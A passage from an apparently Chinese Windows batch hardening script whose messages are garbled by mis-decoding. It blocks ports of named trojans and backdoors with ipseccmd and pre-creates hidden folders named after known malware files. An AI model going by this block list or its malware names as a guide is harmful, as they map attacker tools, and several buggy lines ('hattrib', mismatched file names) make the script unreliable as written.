ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
echo �ر�ľ��The InvasorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
echo �ر�ľ��PriotrityĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
echo �ر�ľ��Phineas PhuckerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo �ر�ľ��VodooĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters ParadiseĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
echo �ر�ľ��WincrashĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo �ر�ľ��Wincrash2Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
echo �ر�ľ��WinCrashĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo �ر�ľ��NetspyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
echo �ر�ľ��ICQTrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
echo �ر�ľ��ShockRaveĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de TroieĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo �ر�ľ��Stealth SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de Troie 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ��Pass RipperĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
echo �ر�ľ��FirehotckerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo �ر�ľ��Attack FTPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade RunnerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
echo �ر�ľ��GirlFriendĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade Runner 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
echo �ر�ľ��Fore SchwindlerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade Runner 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
echo �ر�ľ��Tiny Telnet ServerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo �ر�ľ��Robo-HackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
echo �ر�ľ��KuangĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo �ر�ľ��Senna Spy TrojansĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
echo �ر�ľ��DeepThroatĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
echo �ر�ľ��WhackJobĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��GateCrasherĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo �ر�ľ��Phase0Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
echo �ر�ľ��PriorityĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
echo �ر�ľ��Blade RunnerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote GrabĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
echo �ر�ľ��IcqTrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
echo �ر�ľ��InIkillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal Of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 2.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
echo �ر�ľ��Progenic TrojanĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 3.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
echo �ر�ľ��BackDoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
echo �ر�Զ�̿������VNCĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
echo �ر�Զ�̿������VNCĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
echo �ر�ľ��Prosiak 0.47Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
echo �ر�ľ�����Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
echo �ر�ľ��msblastĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitor 4.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
echo �ر�Զ�̿��������dameware nt utilities)Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
echo �ر�ľ��RipperĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
echo �ر�ľ��VooDoo DollĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
echo �ر�ľ��BO jammerkillahVĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/456" -f *+0:456:TCP -n BLOCK -x >nul
echo �ر�ľ��Hackers ParadiseĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
echo �ر�ľ��Stealth SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
echo �ر�ľ��Satanz BackdoorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
echo �ر�ľ��SilencerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
echo �ر�ľ��NetspyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote GrabĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300 " -f *+0:7300:TCP -n BLOCK -x >nul
echo �ر�ľ��NetMonitorĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
echo �ر�ľ��Ugly FTPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
echo �ر�ľ��Ugly FTPĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100 " -f *+0:30100:TCP -n BLOCK -x >nul
echo �ر�ľ��NetSphereĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9899" -f *+0:9899:TCP -n BLOCK -x >nul
echo �ر�ľ��iNi-KillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
echo �ر�ľ��Sockets de TroieĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
echo �ر�ľ��IndoctrinationĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
echo �ر�ľ��Senna SpyĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12223" -f *+0:12223:TCP -n BLOCK -x >nul
echo �ر�ľ��Hack?99 KeyLoggerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12362" -f *+0:12362:TCP -n BLOCK -x >nul
echo �ر�ľ��Whack-a-mole 1.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
echo �ر�ľ��MilleniumĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
echo �ر�ľ��Wincrash v2Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
echo �ر�ľ��Remote Windows ShutdownĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
echo �ر�ľ��ICKillerĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
echo �ر�ľ��Masters Paradise 3.xĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
echo �ر�ľ��RoboHackĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8000" -f *+0:8000:TCP -n BLOCK -x >nul
echo �ر�ľ��huigeziĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
echo �ر�ľ��Portal of DoomĬ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2005" -f *+0:2005:TCP -n BLOCK -x >nul
echo �ر�ľ��ڶ�2005Ĭ�Ϸ���˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
echo �رղʺ���1.2Ĭ�϶˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9999" -f *+0:9999:TCP -n BLOCK -x >nul
echo �ر�huigeziӳ��Ĭ�϶˿ڡ�������OK!
ipseccmd -w REG -p "HFUT_SECU" -x >nul
gpupdate >nul
echo.
echo  ��ȫЭ��ȫ��������ϣ�����ϵͳ��������������没��������ľ����ŵ����ţ�
echo  ���ܾ����񡱰����簲ȫЭ�����Ѿ���ȫ��������ˣ�������������ļ������              
echo. 
echo. �밴�����������һ�㡭��
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����





:mark18
cls
title ��ʱ�ػ�
echo.                  �� ʱ �� ��
echo.    -----------------------------------------
echo.
echo.
echo     ������ػ�ʱ��,(��12:00:00)    Y.���ز˵�
echo.
set /p shutdowntime=     
IF /I "%shutdowntime%"=="Y" goto mark0
at %shutdowntime% tsshutdn 0 /delay:0 /powerdown >nul
IF not errorlevel 1 goto ok
echo     %shutdowntime% ���Ǳ�׼��ʱ���ʽ,����������
echo.
goto dsgj
:ok
echo.
echo            �趨���! �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����



:mark19
cls
title �쿴ϵͳ��Ϣ
systeminfo 
echo             �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����



:mark20
cls
title  C�̷���
md %systemroot%\0sy.exe
attrib %systemroot%\0sy.exe +S +R +H

md %systemroot%\1sy.exe
attrib %systemroot%\1sy.exe +S +R +H

md %systemroot%\2sy.exe
attrib %systemroot%\2sy.exe +S +R +H

md %systemroot%\3sy.exe
attrib %systemroot%\3sy.exe +S +R +H

md %systemroot%\4sy.exe
attrib %systemroot%\4sy.exe +S +R +H

md %systemroot%\5sy.exe
attrib %systemroot%\5sy.exe +S +R +H

md %systemroot%\6sy.exe
attrib %systemroot%\6sy.exe +S +R +H

md %systemroot%\7sy.exe
attrib %systemroot%\7sy.exe +S +R +H

md %systemroot%\8sy.exe
attrib %systemroot%\8sy.exe +S +R +H

md %systemroot%\9sy.exe
attrib %systemroot%\9sy.exe +S +R +H

md %systemroot%\logo1_.exe
attrib %systemroot%\logo1_.exe +S +R +H

md %systemroot%\logo.exe
attrib %systemroot%\logo.exe +S +R +H

md %systemroot%\logo1.exe
attrib %systemroot%\logo1.exe +S +R +H

md %systemroot%\logo_1.exe
attrib %systemroot%\logo_1.exe +S +R +H

md %systemroot%\rundl132.exe
attrib %systemroot%\rundl132.exe +S +R +H

md %systemroot%\rund1l32.exe
attrib %systemroot%\rundl132.exe +S +R +H

md %systemroot%\rund1132.exe
attrib %systemroot%\rundl132.exe +S +R +H

md %systemroot%\CA_Crash_info.nfo
attrib %systemroot%\CA_Crash_info.nfo +S +R +H

md %systemroot%\cmcc.exe
attrib %systemroot%\cmcc.exe +S +R +H

md %systemroot%\csrss.exe
attrib %systemroot%\ccsrss.exe +S +R +H

md %systemroot%\fox.exe
attrib %systemroot%\fox.exe +S +R +H

md %systemroot%\GOG.exe
attrib %systemroot%\GOG.exe +S +R +H

md %systemroot%\GOG.sys
attrib %systemroot%\GOG.sys +S +R +H

md %systemroot%\kernel32.exe
attrib %systemroot%\kernel32.exe +S +R +H

md %systemroot%\lesste.exe
attrib %systemroot%\lesste.exe +S +R +H

md %systemroot%\MFCD3O.DLL
attrib %systemroot%\MFCD3O.DLL +S +R +H

md %systemroot%\MSTRAY.EXE
attrib %systemroot%\MSTRAY.EXE +S +R +H

md %systemroot%\smss.exe
attrib %systemroot%\smss.exe +S +R +H

md %systemroot%\svch0st_.exe
attrib %systemroot%\svch0st_.exe +S +R +H

md %systemroot%\svchost64.exe
attrib %systemroot%\svchost64.exe +S +R +H

md %systemroot%\sws.dll
attrib %systemroot%\sws.dll +S +R +H

md %systemroot%\system33.exe
attrib %systemroot%\system33.exe +S +R +H

md %systemroot%\Systra.exe
attrib %systemroot%\Systra.exe +S +R +H

md %systemroot%\doc1.exe
attrib %systemroot%\doc1.exe +S +R +H

md %systemroot%\doc.exe
attrib %systemroot%\doc.exe +S +R +H

md %systemroot%\sws32.dll
attrib %systemroot%\sws32.dll +S +R +H

md %systemroot%\KILL.EXE
attrib %systemroot%\KILL.EXE +S +R +H

md %systemroot%\systra.exe
attrib %systemroot%\systra.exe +S +R +H

md %systemroot%\virDll.dll
attrib %systemroot%\virDll.dll +S +R +H

::======================================================
::                        system32
::======================================================

md %systemroot%\system32\hxdef.exe
attrib %systemroot%\system32\hxdef.exe +S +R +H

md %systemroot%\system32\kernel66.dll
attrib %systemroot%\system32\kernel66.dll +S +R +H

md %systemroot%\system32\Latterpy.dll
attrib %systemroot%\system32\Latterpy.dll +S +R +H

md %systemroot%\system32\LayerInstall.exe
attrib %systemroot%\system32\LayerInstall.exe +S +R +H

md %systemroot%\system32\layerpop.ini
attrib %systemroot%\system32\layerpop.ini +S +R +H

md %systemroot%\system32\msjdbc11.dll
attrib %systemroot%\system32\msjdbc11.dll +S +R +H

md %systemroot%\system32\MSSIGN30.DLL
attrib %systemroot%\system32\MSSIGN30.DLL +S +R +H

md %systemroot%\system32\NetMeeting.exe
attrib %systemroot%\system32\NetMeeting.exe +S +R +H

md %systemroot%\system32\ntdhcp.exe
attrib %systemroot%\system32\ntdhcp.exe +S +R +H

md %systemroot%\system32\odbc16.dll
attrib %systemroot%\system32\odbc16.dll +S +R +H

md %systemroot%\system32\ravmond.exe
attrib %systemroot%\system32\ravmond.exe +S +R +H

md %systemroot%\system32\Runouce.exe
attrib %systemroot%\system32\Runouce.exe +S +R +H

md %systemroot%\system32\spollsv.exe
attrib %systemroot%\system32\spollsv.exe +S +R +H

md %systemroot%\system32\sys.exe
attrib %systemroot%\system32\sys.exe +S +R +H

md %systemroot%\system32\word.exe
attrib %systemroot%\system32\word.exe +S +R +H

md %systemroot%\system32\0sy.exe
attrib %systemroot%\system32\0sy.exe +S +R +H

md %systemroot%\system32\1sy.exe
attrib %systemroot%\system32\1sy.exe +S +R +H

md %systemroot%\system32\2sy.exe
attrib %systemroot%\system32\2sy.exe +S +R +H

md %systemroot%\system32\3sy.exe
attrib %systemroot%\system32\3sy.exe +S +R +H

md %systemroot%\system32\4sy.exe
attrib %systemroot%\system32\4sy.exe +S +R +H

md %systemroot%\system32\5sy.exe
attrib %systemroot%\system32\5sy.exe +S +R +H

md %systemroot%\system32\6sy.exe
attrib %systemroot%\system32\6sy.exe +S +R +H

md %systemroot%\system32\7sy.exe
attrib %systemroot%\system32\7sy.exe +S +R +H

md %systemroot%\system32\8sy.exe
attrib %systemroot%\system32\8sy.exe +S +R +H

md %systemroot%\system32\9sy.exe
attrib %systemroot%\system32\9sy.exe +S +R +H

md %systemroot%\system32\logo1_.exe
attrib %systemroot%\system32\logo1_.exe +S +R +H

md %systemroot%\system32\logo.exe
attrib %systemroot%\system32\logo.exe +S +R +H

md %systemroot%\system32\logo1.exe
attrib %systemroot%\system32\logo1.exe +S +R +H

md %systemroot%\system32\logo_1.exe
attrib %systemroot%\system32\logo_1.exe +S +R +H

md %systemroot%\system32\rundl132.exe
attrib %systemroot%\system32\rundl132.exe +S +R +H

md %systemroot%\system32\rund1l32.exe
attrib %systemroot%\system32\rundl132.exe +S +R +H

md %systemroot%\system32\rund1132.exe
attrib %systemroot%\system32\rundl132.exe +S +R +H

md %systemroot%\system32\001.exe
attrib %systemroot%\system32\001.exe +S +R +H

md %systemroot%\system32\111.dll
attrib %systemroot%\system32\111.dll +S +R +H

md %systemroot%\system32\444.reg
attrib %systemroot%\system32\444.reg +S +R +H

md %systemroot%\system32\alerte.exe
attrib %systemroot%\system32\alerte.exe +S +R +H

md %systemroot%\system32\capp.exe
attrib %systemroot%\system32\capp.exe +S +R +H

md %systemroot%\system32\chk20.exe
attrib %systemroot%\system32\chk20.exe +S +R +H

md %systemroot%\system32\chk.exe
attrib %systemroot%\system32\chk.exe +S +R +H

md %systemroot%\system32\comload.dll
attrib %systemroot%\system32\comload.dll +S +R +H

md %systemroot%\system32\comwsock.dll
attrib %systemroot%\system32\comwsock.dll +S +R +H

md %systemroot%\system32\cvssdp.exe
attrib %systemroot%\system32\cvssdp.exe +S +R +H

md %systemroot%\system32\dmsti.exe
attrib %systemroot%\system32\dmsti.exe +S +R +H

md %systemroot%\system32\exp1orer.exe
attrib %systemroot%\system32\exp1orer.exe +S +R +H

md %systemroot%\system32\fensvc32.exe
attrib %systemroot%\system32\fensvc32.exe +S +R +H

md %systemroot%\system32\hiddukel.dll
attrib %systemroot%\system32\hiddukel.dll +S +R +H

md %systemroot%\system32\huanyuan.exe
hattrib %systemroot%\system32\uanyuan.exe +S +R +H

md %systemroot%\system32\interapi32.dll
attrib %systemroot%\system32\interapi32.dll +S +R +H

md %systemroot%\system32\interapi64.dll
attrib %systemroot%\system32\interapi64.dll +S +R +H

md %systemroot%\system32\intneter.exe
attrib %systemroot%\system32\intneter.exe +S +R +H

md %systemroot%\system32\istinstall_mpb1126.exe
attrib %systemroot%\system32\istinstall_mpb1126.exe +S +R +H

md %systemroot%\system32\grouppolicy
attrib %systemroot%\system32\grouppolicy +S +R +H

md %systemroot%\system32\lmmib20.dll
attrib %systemroot%\system32\lmmib20.dll +S +R +H

md %systemroot%\system32\mofei.cfg
attrib %systemroot%\system32\mofei.cfg +S +R +H

md %systemroot%\system32\msbb.exe
attrib %systemroot%\system32\msbb.exe +S +R +H

md %systemroot%\system32\msconfd.dll
attrib %systemroot%\system32\msconfd.dll +S +R +H

md %systemroot%\system32\mseggrpid.dll
attrib %systemroot%\system32\mseggrpid.dll +S +R +H

md %systemroot%\system32\navihelper.dll
attrib %systemroot%\system32\avihelper.dll +S +R +H

md %systemroot%\system32\ncmyb.dll
attrib %systemroot%\system32\ncmyb.dll +S +R +H

md %systemroot%\system32\ndistcp.exe
attrib %systemroot%\system32\ndistcp.exe +S +R +H

md %systemroot%\system32\netservice.exe
attrib %systemroot%\system32\netservice.exe +S +R +H

md %systemroot%\system32\nmgamex.dll
attrib %systemroot%\system32\nmgamex.dll +S +R +H

md %systemroot%\system32\p2ecom.dll
attrib %systemroot%\system32\p2ecom.dll +S +R +H

md %systemroot%\system32\packet.dll
attrib %systemroot%\system32\packet.dll +S +R +H

md %systemroot%\system32\pj.exe
attrib %systemroot%\system32\pj.exe +S +R +H

md %systemroot%\system32\pojie.exe
attrib %systemroot%\system32\pojie.exe +S +R +H

md %systemroot%\system32\psintbs.dll
attrib %systemroot%\system32\psintbs.dll +S +R +H

md %systemroot%\system32\reg678.dll
attrib %systemroot%\system32\reg678.dll +S +R +H

md %systemroot%\system32\rundl132.exe
attrib %systemroot%\system32\rundl132.exe +S +R +H

md %systemroot%\system32\rund1l32.exe
attrib %systemroot%\system32\rund1l32.exe +S +R +H

md %systemroot%\system32\rund1132.exe
attrib %systemroot%\system32\rund1132.exe +S +R +H

md %systemroot%\system32\scardsvr32.dll
attrib %systemroot%\system32\scardsvr32.dll +S +R +H

md %systemroot%\system32\scardsvr32.exe
attrib %systemroot%\system32\scardsvr32.exe +S +R +H

md %systemroot%\system32\sinaproc327.exe
attrib %systemroot%\system32\sinaproc327.exe +S +R +H

md %systemroot%\system32\soft.dll.exe
attrib %systemroot%\system32\soft.dll.exe +S +R +H

md %systemroot%\system32\sptres.dll
attrib %systemroot%\system32\sptres.dll +S +R +H

md %systemroot%\system32\syscpy1.exe
attrib %systemroot%\system32\syscpy1.exe +S +R +H

md %systemroot%\system32\syscpy.exe
attrib %systemroot%\system32\syscpy.exe +S +R +H

md %systemroot%\system32\sysexplorer.exe
attrib %systemroot%\system32\sysexplorer.exe +S +R +H

md %systemroot%\system32\syslggo.exe
attrib %systemroot%\system32\syslggo.exe +S +R +H

md %systemroot%\system32\sysnet.exe
attrib %systemroot%\system32\sysnet.exe +S +R +H

md %systemroot%\system32\system32.exe
attrib %systemroot%\system32\system32.exe +S +R +H

md %systemroot%\system32\system.exe
attrib %systemroot%\system32\system.exe +S +R +H

md %systemroot%\system32\systemwin.exe
attrib %systemroot%\system32\systemwin.exe +S +R +H

md %systemroot%\system32\systrect.exe
attrib %systemroot%\system32\systrect.exe +S +R +H

md %systemroot%\system32\sysvem.dll
attrib %systemroot%\system32\sysvem.dll +S +R +H

md %systemroot%\system32\tcdex.exe
attrib %systemroot%\system32\tcdex.exe +S +R +H

md %systemroot%\system32\temphttp.dll
attrib %systemroot%\system32\temphttp.dll +S +R +H

md %systemroot%\system32\vmm32.vxd
attrib %systemroot%\system32\vmm32.vxd +S +R +H

md %systemroot%\system32\win32usb.exe
attrib %systemroot%\system32\win32usb.exe +S +R +H

md %systemroot%\system32\winhelp.exe
attrib %systemroot%\system32\winhelp.exe +S +R +H

md %systemroot%\system32\winrpc.exe
attrib %systemroot%\system32\winrpc.exe +S +R +H

md %systemroot%\system32\winsocks.dll
attrib %systemroot%\system32\winsocks.dll +S +R +H

md %systemroot%\system32\winsym.exe
attrib %systemroot%\system32\winsym.exe +S +R +H

md %systemroot%\system32\ws2_64.dll
attrib %systemroot%\system32\ws2_64.dll +S +R +H

md %systemroot%\system32\wsink.dll
attrib %systemroot%\system32\wsink.dll +S +R +H

echo             �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����




:mark21
cls
title �쿴�û��б�

cd.>netuser.txt
for /f "skip=4 tokens=1-3" %%i in ('net user') do (
    if not "%%i"=="����ɹ���ɡ�" net use %%i>>netuser.txt 2>nul
    if not "%%j"=="" net user %%j>>netuser.txt 2>nul
    if not "%%k"=="" net user %%k>>netuser.txt 2>nul
)
start netuser.txt
ping -n 2 127.1>nul
del netuser.txt

echo             �������������һ��...
pause >nul
goto mark0
exit                    ::��ֹ�����ּ�����


:mark22
cls
title ��ʾ������ʣ��ռ����

echo        �X�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�[
echo        �U        ���̷���         ���̾����      ʣ��ռ�(MB)       �U
echo        �U    _____________________________________________________   �U
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\nul (
